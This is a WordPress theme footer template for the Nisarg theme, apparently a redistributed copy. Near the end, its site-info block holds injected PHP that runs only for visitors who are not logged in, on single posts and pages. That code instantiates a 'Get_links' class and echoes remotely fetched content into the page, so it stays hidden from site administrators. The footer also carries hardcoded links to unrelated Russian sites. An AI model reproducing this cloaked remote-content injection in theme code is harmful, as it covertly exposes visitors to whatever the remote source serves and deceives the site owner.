<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package Nisarg
 */

?>

	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="row site-info">
			<?php echo '&copy; '.date("Y"); ?> 
			<?php if (is_home() || is_category() || is_archive() ){ ?> <span class="sep"> | </span>  <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> / <a href="http://www.falgunidesai.com/" rel="designer">Falguni Desai</a> / <a href="http://svoimirukamy.com/" rel="nofollow" title="Поделки своими руками" target="_blank">Своими руками</a><?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>

		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->
<?php wp_footer(); ?>
</body>
</html>
